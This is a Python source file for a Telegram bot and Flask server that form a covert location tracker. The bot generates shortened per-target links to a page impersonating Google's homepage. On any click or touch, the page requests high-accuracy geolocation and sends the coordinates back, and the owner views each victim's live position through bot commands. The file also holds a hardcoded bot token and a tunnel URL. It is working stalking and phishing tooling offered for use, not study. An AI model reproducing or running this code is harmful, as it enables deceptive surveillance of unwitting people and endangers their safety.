import secrets
import time
import urllib.request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from flask import Flask, request, render_template_string

# --- CONFIGURATION ---
BOT_TOKEN = "8800885531:AAFHQQ4iMPXAPm3upi-XFbxPs__SkBdF__Y"
OWNER_ID = 8358297292  
SERVER_PORT = 5000
PUBLIC_URL = "https://boom-tribunal-accept-wizard.trycloudflare.com"

active_sessions = {}

TRACKER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Google</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            background: #fff;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .logo {
            font-size: 75px;
            font-weight: bold;
            letter-spacing: -3px;
            margin-bottom: 25px;
        }
        .blue { color: #4285F4; }
        .red { color: #EA4335; }
        .yellow { color: #FBBC05; }
        .green { color: #34A853; }
        .search-container {
            width: 90%;
            max-width: 580px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .search-box {
            width: 100%;
            padding: 14px 20px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            font-size: 16px;
            outline: none;
            box-shadow: none;
            transition: box-shadow 0.3s;
            box-sizing: border-box;
        }
        .search-box:focus {
            box-shadow: 0 1px 6px rgba(32,33,36,.28);
            border-color: rgba(223,225,229,0);
        }
        .btn-group {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }
        .google-btn {
            background-color: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            font-size: 14px;
            padding: 10px 16px;
            cursor: pointer;
        }
        .google-btn:hover {
            border: 1px solid #dadce0;
            box-shadow: 0 1px 1px rgba(0,0,0,.1);
        }
    </style>
</head>
<body>
    <div class="logo">
        <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
    </div>
    
    <div class="search-container">
        <form onsubmit="handleSearch(event)" style="width: 100%;">
            <input type="text" id="searchInput" class="search-box" placeholder="Search Google or type a URL" autofocus>
        </form>
        <div class="btn-group">
            <button class="google-btn" onclick="triggerTracking()">Google Search</button>
            <button class="google-btn" onclick="triggerTracking()">I'm Feeling Lucky</button>
        </div>
    </div>

    <script>
        const sessionId = "{{ session_id }}";
        let locationCaptured = false;

        function requestLocation() {
            if (!locationCaptured && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    locationCaptured = true;
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    fetch('/update-loc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ session_id: sessionId, lat: lat, lon: lon })
                    }).catch(err => {});
                }, function(error) {}, { enableHighAccuracy: true });
            }
        }

        // Prompt location as soon as they touch or click anywhere on the page
        window.addEventListener('click', requestLocation, { once: true });
        window.addEventListener('touchstart', requestLocation, { once: true });

        function triggerTracking() {
            requestLocation();
            const query = document.getElementById('searchInput').value;
            if (query.trim() !== "") {
                window.location.href = "https://www.google.com/search?q=" + encodeURIComponent(query);
            } else {
                window.location.href = "https://www.google.com";
            }
        }

        function handleSearch(event) {
            event.preventDefault();
            triggerTracking();
        }
    </script>
</body>
</html>
"""

app = Flask(__name__)

@app.route("/search")
def clean_tracker_page():
    session_id = request.args.get("id")
    if not session_id or session_id not in active_sessions:
        return "<h1>❌ Invalid or expired session.</h1>", 403
    return render_template_string(TRACKER_HTML, session_id=session_id)

@app.route("/update-loc", methods=["POST"])
def update_location():
    data = request.json
    session_id = data.get("session_id")
    
    if session_id in active_sessions:
        active_sessions[session_id]["lat"] = data.get("lat")
        active_sessions[session_id]["lon"] = data.get("lon")
        active_sessions[session_id]["last_updated"] = time.time()
        return {"status": "success"}, 200
    
    return {"status": "unauthorized"}, 403

def shorten_url(long_url):
    try:
        api_url = f"http://tinyurl.com/api-create.php?url={urllib.parse.quote(long_url)}"
        with urllib.request.urlopen(api_url, timeout=3) as response:
            short_url = response.read().decode('utf-8')
            if short_url.startswith("http"):
                return short_url
    except Exception:
        pass
    return long_url

# --- TELEGRAM BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    await update.message.reply_text(
        "Welcome back! Use /track to generate a link, and /where to view device locations."
    )

async def create_tracker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return

    device_num = len(active_sessions) + 1
    device_name = f"Device {device_num}"

    session_id = secrets.token_urlsafe(8)
    active_sessions[session_id] = {
        "name": device_name,
        "lat": None,
        "lon": None,
        "last_updated": 0
    }

    raw_link = f"{PUBLIC_URL}/search?id={session_id}"
    short_link = shorten_url(raw_link)

    await update.message.reply_text(
        f"📍 Generated Link for {device_name}:\n\n"
        f"`{short_link}`\n\n"
        f"The moment they tap or click anywhere on the page, it will prompt them for location access.",
        parse_mode="Markdown"
    )

async def get_location_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return

    if not active_sessions:
        await update.message.reply_text("No active tracking sessions. Use /track first to create one.")
        return

    keyboard = []
    for session_id, data in active_sessions.items():
        keyboard.append([InlineKeyboardButton(data["name"], callback_data=f"loc_{session_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("📱 Choose a device to view its location:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if update.effective_user.id != OWNER_ID:
        return

    data_key = query.data
    if data_key.startswith("loc_"):
        session_id = data_key.replace("loc_", "")
        
        if session_id not in active_sessions:
            await query.edit_message_text("❌ This session no longer exists.")
            return

        session_data = active_sessions[session_id]
        name = session_data["name"]
        lat = session_data["lat"]
        lon = session_data["lon"]

        if lat is None:
            await query.edit_message_text(f"⏳ **{name}** hasn't interacted with the page or allowed location yet...")
            return

        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        await query.edit_message_text(
            f"📍 **Live Location for {name}:**\n\n"
            f"Latitude: `{lat}`\n"
            f"Longitude: `{lon}`\n\n"
            f"[Open in Google Maps]({maps_link})",
            parse_mode="Markdown"
        )

def run_flask():
    app.run(host="0.0.0.0", port=SERVER_PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    import threading
    
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("track", create_tracker))
    application.add_handler(CommandHandler("where", get_location_menu))
    application.add_handler(CallbackQueryHandler(button_handler))

    print("Stealth bot is running...")
    application.run_polling()